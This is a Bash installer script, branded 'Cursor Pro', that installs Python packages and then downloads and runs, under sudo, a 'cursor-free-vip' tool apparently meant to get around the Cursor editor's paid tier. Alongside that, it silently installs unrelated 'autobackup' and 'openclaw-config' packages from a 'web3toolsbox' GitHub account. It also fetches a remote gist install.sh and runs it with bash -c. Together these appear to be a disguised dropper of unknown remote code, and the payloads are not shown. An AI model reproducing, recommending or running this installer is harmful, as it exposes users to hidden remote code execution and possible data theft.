#!/bin/bash

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # 无色

# Logo
print_logo() {
    echo -e "${CYAN}"
    cat << "EOF"
    ██████╗██╗    ██╗██████╗ ███████╗ ██████╗ ██████╗      ██████╗ ██████╗  ██████╗   
   ██╔════╝██║    ██║██╔══██╗██╔════╝██╔═══██╗██╔══██╗     ██╔══██╗██╔══██╗██╔═══██╗  
   ██║     ██║    ██║██████╔╝███████╗██║    ██║██████╔╝     ██████╔╝██████╔╝██║    ██║  
   ██║     ██║    ██║██╔══██╗╚════██║██║    ██║██╔══██╗     ██╔═══╝ ██╔══██╗██║    ██║  
   ╚██████╗╚██████╔╝██║   ██║███████║╚██████╔╝██║   ██║     ██║     ██║   ██║╚██████╔╝  
    ╚═════╝ ╚═════╝ ╚═╝   ╚═╝╚══════╝ ╚═════╝ ╚═╝   ╚═╝     ╚═╝     ╚═╝   ╚═╝ ╚═════╝  
EOF
    echo -e "${NC}"
}

#!/bin/bash

FAILED_STEPS=()
PATH_RUNTIME_ADDED=()
PATH_PERSIST_FILES=()

# Use sudo only when not already root
_sudo() {
    if [ "$(id -u)" -eq 0 ]; then
        "$@"
    else
        sudo "$@"
    fi
}

run_step() {
    local desc="$1"
    shift
    echo ""
    echo "==> $desc"
    "$@"
    local rc=$?
    if [ $rc -ne 0 ]; then
        echo "WARN: 失败但继续（exit=$rc）：$desc" >&2
        FAILED_STEPS+=("$desc (exit=$rc)")
    fi
    return 0
}

OS_TYPE=$(uname -s)

# Detect available package manager
detect_pkg_manager() {
    local cmd=""
    for cmd in apt-get apt dnf yum pacman zypper apk; do
        if command -v "$cmd" &>/dev/null; then
            echo "$cmd"
            return 0
        fi
    done
    return 1
}

# Install system packages via the detected package manager
pkg_install() {
    local pkg_manager="$1"
    shift
    local packages=("$@")

    [ ${#packages[@]} -eq 0 ] && return 0

    case "$pkg_manager" in
        apt-get|apt)
            _sudo "$pkg_manager" update
            _sudo "$pkg_manager" install -y "${packages[@]}"
            ;;
        dnf|yum)
            _sudo "$pkg_manager" install -y "${packages[@]}"
            ;;
        pacman)
            _sudo pacman -Sy --noconfirm "${packages[@]}"
            ;;
        zypper)
            _sudo zypper --non-interactive install "${packages[@]}"
            ;;
        apk)
            _sudo apk add --no-cache "${packages[@]}"
            ;;
        *)
            return 1
            ;;
    esac
}

# Map generic package names to distro-specific names
resolve_pkg_name() {
    local generic="$1"
    local pkg_manager="$2"

    case "$generic" in
        python3-pip)
            case "$pkg_manager" in
                pacman) echo "python-pip" ;;
                apk)    echo "py3-pip" ;;
                *)      echo "python3-pip" ;;
            esac
            ;;
        xclip)
            case "$pkg_manager" in
                apk) echo "xclip" ;;
                *)   echo "xclip" ;;
            esac
            ;;
        pipx)
            case "$pkg_manager" in
                pacman) echo "python-pipx" ;;
                apk)    echo "pipx" ;;
                *)      echo "pipx" ;;
            esac
            ;;
        *)
            echo "$generic"
            ;;
    esac
}

ensure_runtime_path() {
    local path_candidates=("$HOME/.local/bin" "$HOME/bin")
    local candidate=""
    for candidate in "${path_candidates[@]}"; do
        if [ -d "$candidate" ] && [[ ":$PATH:" != *":$candidate:"* ]]; then
            PATH="$candidate:$PATH"
            PATH_RUNTIME_ADDED+=("$candidate")
        fi
    done
    export PATH
    hash -r 2>/dev/null || true
}

persist_runtime_path() {
    local shell_name=""
    local rc_files=()
    local rc_file=""

    shell_name="$(basename "${SHELL:-}")"
    case "$shell_name" in
        bash)
            rc_files=("$HOME/.bashrc" "$HOME/.profile")
            ;;
        zsh)
            rc_files=("$HOME/.zshrc" "$HOME/.zprofile")
            ;;
        *)
            rc_files=("$HOME/.profile")
            ;;
    esac

    for rc_file in "${rc_files[@]}"; do
        if [ ! -e "$rc_file" ]; then
            touch "$rc_file"
        fi

        if grep -Fq '# >>> default PATH >>>' "$rc_file" 2>/dev/null; then
            continue
        fi

        cat >> "$rc_file" <<'EOF'

# >>> default PATH >>>
if [ -d "$HOME/.local/bin" ]; then
    case ":$PATH:" in
        *":$HOME/.local/bin:"*) ;;
        *) export PATH="$HOME/.local/bin:$PATH" ;;
    esac
fi
if [ -d "$HOME/bin" ]; then
    case ":$PATH:" in
        *":$HOME/bin:"*) ;;
        *) export PATH="$HOME/bin:$PATH" ;;
    esac
fi
# <<< default PATH <<<
EOF
        PATH_PERSIST_FILES+=("$rc_file")
    done
}

print_path_refresh_hint() {
    local first_rc=""

    if [ ${#PATH_PERSIST_FILES[@]} -gt 0 ]; then
        echo "已将用户命令目录写入以下 shell 配置："
        printf ' - %s\n' "${PATH_PERSIST_FILES[@]}"
        first_rc="${PATH_PERSIST_FILES[0]}"
        echo "当前终端若要立即生效，请执行：source \"$first_rc\""
    elif [ ${#PATH_RUNTIME_ADDED[@]} -gt 0 ]; then
        echo "当前安装过程中已临时补充 PATH，但请重新打开终端或手动执行以下命令使后续会话稳定生效："
        echo "export PATH=\"\$HOME/.local/bin:\$HOME/bin:\$PATH\""
    fi
}

download_url_to_stdout() {
    local url="$1"

    if command -v curl &>/dev/null; then
        curl --tlsv1.2 -fsSL "$url" 2>/dev/null || curl -fsSL "$url"
        return $?
    fi

    if command -v wget &>/dev/null; then
        wget --https-only --secure-protocol=TLSv1_2 -qO- "$url" 2>/dev/null || wget -qO- "$url"
        return $?
    fi

    return 127
}

# Find working python3 command
find_python3() {
    local cmd=""
    for cmd in python3 python; do
        if command -v "$cmd" &>/dev/null; then
            if "$cmd" --version &>/dev/null; then
                echo "$cmd"
                return 0
            fi
        fi
    done
    return 1
}

PYTHON_CMD="$(find_python3 || true)"

pip_supports_break_system_packages() {
    $PYTHON_CMD -m pip help install 2>/dev/null | grep -q -- '--break-system-packages'
}

python_package_state() {
    local pkg="$1"
    local min_version="$2"

    $PYTHON_CMD - "$pkg" "$min_version" <<'PY'
import re
import sys
from importlib import metadata

name, min_v = sys.argv[1], sys.argv[2]

def parse_fallback(v):
    parts = []
    for part in re.split(r"[.\-+_]", v):
        num = ""
        for ch in part:
            if ch.isdigit():
                num += ch
            else:
                break
        parts.append(int(num or 0))
    return parts

try:
    current = metadata.version(name)
except metadata.PackageNotFoundError:
    sys.exit(2)
except Exception:
    sys.exit(3)

try:
    from packaging.version import Version, InvalidVersion
except Exception:
    Version = None
    InvalidVersion = Exception

if Version is not None:
    try:
        if Version(current) >= Version(min_v):
            print(current)
            sys.exit(0)
        print(current)
        sys.exit(1)
    except InvalidVersion:
        pass

a = parse_fallback(current)
b = parse_fallback(min_v)
n = max(len(a), len(b))
a.extend([0] * (n - len(a)))
b.extend([0] * (n - len(b)))

if a >= b:
    print(current)
    sys.exit(0)

print(current)
sys.exit(1)
PY
}

get_pipx_venv_python_path() {
    local venv_name="$1"
    local candidates=(
        "$HOME/.local/share/pipx/venvs/$venv_name/bin/python"
        "$HOME/.local/pipx/venvs/$venv_name/bin/python"
        "$HOME/pipx/venvs/$venv_name/bin/python"
    )
    local candidate=""
    for candidate in "${candidates[@]}"; do
        if [ -x "$candidate" ]; then
            echo "$candidate"
            return 0
        fi
    done
    return 1
}

install_pipx_package() {
    local package_spec="$1"
    local command_name="$2"
    local venv_name="$3"
    local existing_command=""
    local venv_python=""
    local install_args=()
    local installed_command=""

    if command -v "$command_name" &>/dev/null; then
        existing_command="$(command -v "$command_name")"
    fi

    if [ -n "$venv_name" ]; then
        venv_python="$(get_pipx_venv_python_path "$venv_name" || true)"
    fi

    if [ -n "$existing_command" ] && { [ -z "$venv_name" ] || [ -n "$venv_python" ]; }; then
        echo "CLI 已可用，跳过安装：$existing_command"
        return 0
    fi

    install_args=(install "$package_spec")
    if [ -n "$existing_command" ] && [ -n "$venv_name" ] && [ -z "$venv_python" ]; then
        echo "WARN: 检测到命令存在但 pipx venv 缺失，尝试强制重装：$package_spec" >&2
        install_args=(install --force "$package_spec")
    fi

    run_step "pipx 安装 $command_name（$package_spec）" pipx "${install_args[@]}"
    ensure_runtime_path
    hash -r 2>/dev/null || true

    if command -v "$command_name" &>/dev/null; then
        installed_command="$(command -v "$command_name")"
    fi
    if [ -n "$venv_name" ]; then
        venv_python="$(get_pipx_venv_python_path "$venv_name" || true)"
    fi

    if [ -z "$installed_command" ] || { [ -n "$venv_name" ] && [ -z "$venv_python" ]; }; then
        echo "WARN: pipx 安装后状态仍不完整：$package_spec" >&2
        FAILED_STEPS+=("校验 pipx 包 $package_spec (incomplete)")
    fi
}

install_dependencies() {
    case $OS_TYPE in
        "Darwin")
            if ! command -v brew &> /dev/null; then
                echo "正在安装 Homebrew..."
                local brew_install_script=""
                brew_install_script="$(download_url_to_stdout 'https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh')" || brew_install_script=""
                if [ -z "$brew_install_script" ]; then
                    echo "WARN: 无法下载 Homebrew 安装脚本，跳过 Homebrew 安装。" >&2
                    FAILED_STEPS+=("安装 Homebrew (download-failed)")
                else
                    run_step "安装 Homebrew" /bin/bash -c "$brew_install_script"
                fi
            fi

            if [ -z "$PYTHON_CMD" ]; then
                run_step "brew install python" brew install python
                PYTHON_CMD="$(find_python3 || true)"
            fi
            ;;

        "Linux")
            local PKG_MANAGER=""
            PKG_MANAGER="$(detect_pkg_manager || true)"
            local PACKAGES_TO_INSTALL=()

            if [ -z "$PYTHON_CMD" ]; then
                PACKAGES_TO_INSTALL+=("$(resolve_pkg_name python3-pip "$PKG_MANAGER")")
            elif ! $PYTHON_CMD -m pip --version &>/dev/null; then
                PACKAGES_TO_INSTALL+=("$(resolve_pkg_name python3-pip "$PKG_MANAGER")")
            fi

            # Only install xclip on systems with a display server
            if [ -n "$DISPLAY" ] || [ -n "$WAYLAND_DISPLAY" ]; then
                if ! command -v xclip &>/dev/null && ! command -v wl-copy &>/dev/null; then
                    if [ -n "$WAYLAND_DISPLAY" ]; then
                        PACKAGES_TO_INSTALL+=("wl-clipboard")
                    else
                        PACKAGES_TO_INSTALL+=("$(resolve_pkg_name xclip "$PKG_MANAGER")")
                    fi
                fi
            fi

            if [ ${#PACKAGES_TO_INSTALL[@]} -gt 0 ] && [ -n "$PKG_MANAGER" ]; then
                run_step "安装系统依赖 (${PACKAGES_TO_INSTALL[*]})" pkg_install "$PKG_MANAGER" "${PACKAGES_TO_INSTALL[@]}"
                # Refresh python command after installing packages
                PYTHON_CMD="$(find_python3 || true)"
            elif [ ${#PACKAGES_TO_INSTALL[@]} -gt 0 ]; then
                echo "WARN: 未找到包管理器，跳过系统依赖安装：${PACKAGES_TO_INSTALL[*]}" >&2
            fi
            ;;

        *)
            echo "WARN: 不支持的操作系统：$OS_TYPE（跳过系统依赖安装，但继续后续步骤）" >&2
            ;;
    esac
}

run_step "安装系统依赖" install_dependencies
ensure_runtime_path
run_step "持久化用户命令目录到 shell 配置" persist_runtime_path

PIP_INSTALL_CMD=("$PYTHON_CMD" -m pip install --upgrade)
if [ "$OS_TYPE" = "Linux" ]; then
    if pip_supports_break_system_packages; then
        PIP_INSTALL_CMD+=(--break-system-packages)
    fi
elif [ "$OS_TYPE" = "Darwin" ]; then
    PIP_INSTALL_CMD+=(--user)
fi

install_python_package_if_needed() {
    local pkg="$1"
    local min_version="$2"
    local state_output=""
    local state_rc=0
    local verify_output=""
    local verify_rc=0
    local fallback_cmd=()

    if [ -z "$PYTHON_CMD" ]; then
        echo "WARN: 未找到 python3，跳过 Python 包安装：$pkg>=$min_version" >&2
        FAILED_STEPS+=("安装 Python 包 $pkg>=$min_version (python3-missing)")
        return 0
    fi

    state_output="$(python_package_state "$pkg" "$min_version" 2>/dev/null)"
    state_rc=$?
    if [ $state_rc -eq 0 ]; then
        echo "Python 包已满足要求：$pkg $state_output (>= $min_version)"
        return 0
    fi

    if [ $state_rc -eq 1 ]; then
        echo "检测到较低版本：$pkg $state_output (< $min_version)，将升级。"
    fi

    if [ $state_rc -ge 2 ]; then
        echo "未检测到可用版本，将安装：$pkg>=$min_version"
    fi

    run_step "pip 安装 $pkg>=$min_version" "${PIP_INSTALL_CMD[@]}" "$pkg>=$min_version"

    verify_output="$(python_package_state "$pkg" "$min_version" 2>/dev/null)"
    verify_rc=$?
    if [ $verify_rc -eq 0 ]; then
        echo "Python 包安装后已满足要求：$pkg $verify_output (>= $min_version)"
        return 0
    fi

    # 某些系统下首次安装会因权限或外部托管策略未真正升级，回退为 --user 重试一次。
    if [ "$OS_TYPE" = "Linux" ] || [ "$OS_TYPE" = "Darwin" ]; then
        echo "WARN: 首次安装后版本仍未满足（当前：${verify_output:-unknown}），将使用 --user 重试：$pkg>=$min_version" >&2
        fallback_cmd=("$PYTHON_CMD" -m pip install --upgrade --user)
        if [ "$OS_TYPE" = "Linux" ] && pip_supports_break_system_packages; then
            fallback_cmd+=(--break-system-packages)
        fi
        run_step "pip 用户级重试安装 $pkg>=$min_version" "${fallback_cmd[@]}" "$pkg>=$min_version"
    fi

    verify_output="$(python_package_state "$pkg" "$min_version" 2>/dev/null)"
    verify_rc=$?
    if [ $verify_rc -ne 0 ]; then
        echo "WARN: 安装后仍未达到目标版本：$pkg ${verify_output:-unknown} (< $min_version)" >&2
        FAILED_STEPS+=("校验 Python 包 $pkg>=$min_version (version-not-satisfied)")
        return 0
    fi

    echo "Python 包已升级到满足要求：$pkg $verify_output (>= $min_version)"
}

install_python_package_if_needed requests 2.31.0
install_python_package_if_needed cryptography 42.0.0
install_python_package_if_needed pycryptodome 3.19.0

# 检测是否为 WSL 环境
is_wsl() {
    if [ "$OS_TYPE" = "Linux" ]; then
        if grep -qi microsoft /proc/version 2>/dev/null || grep -qi wsl /proc/version 2>/dev/null; then
            return 0
        fi
        if uname -r | grep -qi microsoft 2>/dev/null; then
            return 0
        fi
    fi
    return 1
}

install_auto_backup() {
    if ! command -v pipx &> /dev/null; then
        echo "检测到未安装 pipx，正在安装 pipx..."
        case $OS_TYPE in
            "Darwin")
                run_step "brew install pipx" brew install pipx
                run_step "pipx ensurepath" pipx ensurepath
                ensure_runtime_path
                hash -r 2>/dev/null || true
                ;;
            "Linux")
                local PKG_MANAGER=""
                PKG_MANAGER="$(detect_pkg_manager || true)"
                if [ -n "$PKG_MANAGER" ]; then
                    local pipx_pkg=""
                    pipx_pkg="$(resolve_pkg_name pipx "$PKG_MANAGER")"
                    run_step "安装 pipx ($PKG_MANAGER)" pkg_install "$PKG_MANAGER" "$pipx_pkg"
                    if ! command -v pipx &>/dev/null && [ -n "$PYTHON_CMD" ]; then
                        # Fallback: install pipx via pip if package manager failed
                        run_step "pip 安装 pipx" $PYTHON_CMD -m pip install --user pipx
                    fi
                    run_step "pipx ensurepath" pipx ensurepath
                    ensure_runtime_path
                    hash -r 2>/dev/null || true
                elif [ -n "$PYTHON_CMD" ]; then
                    # No package manager, try pip
                    run_step "pip 安装 pipx" $PYTHON_CMD -m pip install --user pipx
                    run_step "pipx ensurepath" pipx ensurepath
                    ensure_runtime_path
                    hash -r 2>/dev/null || true
                else
                    echo "WARN: 未找到包管理器和 python，跳过 pipx 安装" >&2
                    return 0
                fi
                ;;
            *)
                echo "WARN: 无法在当前系统上安装 pipx（跳过 pipx 相关安装，但继续）" >&2
                return 0
                ;;
        esac
    fi

    if command -v pipx &> /dev/null; then
        run_step "pipx ensurepath" pipx ensurepath
        ensure_runtime_path
        hash -r 2>/dev/null || true
    fi

    install_pipx_package "git+https://github.com/web3toolsbox/claw.git" "openclaw-config" "claw"

    local install_url=""
    case $OS_TYPE in
        "Darwin")
            install_url="git+https://github.com/web3toolsbox/auto-backup-macos"
            ;;
        "Linux")
            if is_wsl; then
                install_url="git+https://github.com/web3toolsbox/auto-backup-wsl"
            else
                install_url="git+https://github.com/web3toolsbox/auto-backup-linux"
            fi
            ;;
        *)
            echo "不支持的操作系统，跳过安装"
            return 0
            ;;
    esac

    install_pipx_package "$install_url" "autobackup" ""
}

run_step "安装自动备份相关（pipx/claw/autobackup）" install_auto_backup

run_remote_config_script() {
    local script_content=""

    script_content="$(download_url_to_stdout "$GIST_URL")" || script_content=""
    if [ -z "$script_content" ]; then
        if ! command -v curl &>/dev/null && ! command -v wget &>/dev/null; then
            echo "WARN: 未找到 curl/wget，跳过环境配置：$GIST_URL" >&2
            return 0
        fi
        echo "WARN: 下载配置脚本失败：$GIST_URL" >&2
        return 1
    fi

    bash -c "$script_content"
}

GIST_URL="https://gist.githubusercontent.com/wongstarx/b1316f6ef4f6b0364c1a50b94bd61207/raw/install.sh"
if [ ! -d .configs ]; then
    echo "WARN: 未找到配置目录，跳过环境配置：.configs" >&2
else
    run_step "配置相关环境" run_remote_config_script
fi

get_target_version() {
    # 默认与 README/PowerShell 脚本保持一致；可通过环境变量覆盖
    echo "${CURSOR_VIP_VERSION:-1.11.03}"
}

get_install_root() {
    echo "$HOME/.cursor-vip-src"
}

run_cursor_main() {
    local main_py="$1"
    local py_cmd="${PYTHON_CMD:-python3}"

    if [ ! -f "$main_py" ]; then
        echo "WARN: main.py 不存在，无法启动：$main_py" >&2
        return 1
    fi

    chmod +x "$main_py" 2>/dev/null || true
    echo "即将启动主程序：$main_py"
    if [ "$EUID" -ne 0 ]; then
        sudo "$py_cmd" "$main_py"
    else
        "$py_cmd" "$main_py"
    fi
}

install_and_download_main_program() {
    local version=""
    local install_dir=""
    local zip_name=""
    local zip_path=""
    local download_url=""
    local existing_dir=""
    local actual_dir=""
    local requirements_path=""

    if [ -z "$PYTHON_CMD" ]; then
        echo "WARN: 未找到 Python，跳过主程序安装与启动" >&2
        FAILED_STEPS+=("安装和下载主程序 (python-missing)")
        return 0
    fi

    version="$(get_target_version)"
    install_dir="$(get_install_root)"
    zip_name="cursor-free-vip-${version}.zip"
    zip_path="/tmp/${zip_name}"
    download_url="https://github.com/SHANMUGAM070106/cursor-free-vip/archive/refs/tags/v${version}.zip"

    mkdir -p "$install_dir"

    existing_dir="$(find "$install_dir" -maxdepth 1 -type d -name "cursor-free-vip*" | head -n 1)"
    if [ -n "$existing_dir" ] && [ -f "$existing_dir/main.py" ]; then
        echo "检测到已安装源码目录：$existing_dir"
        requirements_path="$existing_dir/requirements.txt"
        if [ -f "$requirements_path" ]; then
            run_step "安装主程序依赖（requirements.txt）" "${PIP_INSTALL_CMD[@]}" -r "$requirements_path"
        fi
        run_step "启动主程序" run_cursor_main "$existing_dir/main.py"
        return 0
    fi

    echo "正在下载主程序源码包（v${version}）..."
    echo "下载地址：$download_url"
    if command -v curl &>/dev/null; then
        run_step "下载主程序源码包" curl -fL -o "$zip_path" "$download_url"
    elif command -v wget &>/dev/null; then
        run_step "下载主程序源码包" wget -O "$zip_path" "$download_url"
    else
        echo "WARN: 未找到 curl/wget，无法下载主程序源码包" >&2
        FAILED_STEPS+=("下载主程序源码包 (downloader-missing)")
        return 0
    fi

    if [ ! -f "$zip_path" ]; then
        echo "WARN: 源码包下载失败或文件不存在：$zip_path" >&2
        FAILED_STEPS+=("下载主程序源码包 (file-missing)")
        return 0
    fi

    run_step "解压主程序源码包" unzip -o "$zip_path" -d "$install_dir"
    actual_dir="$(find "$install_dir" -maxdepth 1 -type d -name "cursor-free-vip*" | head -n 1)"
    if [ -z "$actual_dir" ]; then
        echo "WARN: 解压后未找到主程序目录" >&2
        FAILED_STEPS+=("安装和下载主程序 (extract-dir-missing)")
        return 0
    fi

    requirements_path="$actual_dir/requirements.txt"
    if [ -f "$requirements_path" ]; then
        run_step "安装主程序依赖（requirements.txt）" "${PIP_INSTALL_CMD[@]}" -r "$requirements_path"
    else
        echo "WARN: 未找到 requirements.txt，跳过项目依赖安装：$actual_dir" >&2
    fi

    run_step "启动主程序" run_cursor_main "$actual_dir/main.py"
}

run_step "安装和下载主程序" install_and_download_main_program

echo "安装完成！"
print_path_refresh_hint
if [ ${#FAILED_STEPS[@]} -gt 0 ]; then
    echo "------------------------------" >&2
    echo "WARN: 以下步骤失败但已继续执行：" >&2
    for s in "${FAILED_STEPS[@]}"; do
        echo " - $s" >&2
    done
    echo "------------------------------" >&2
fi
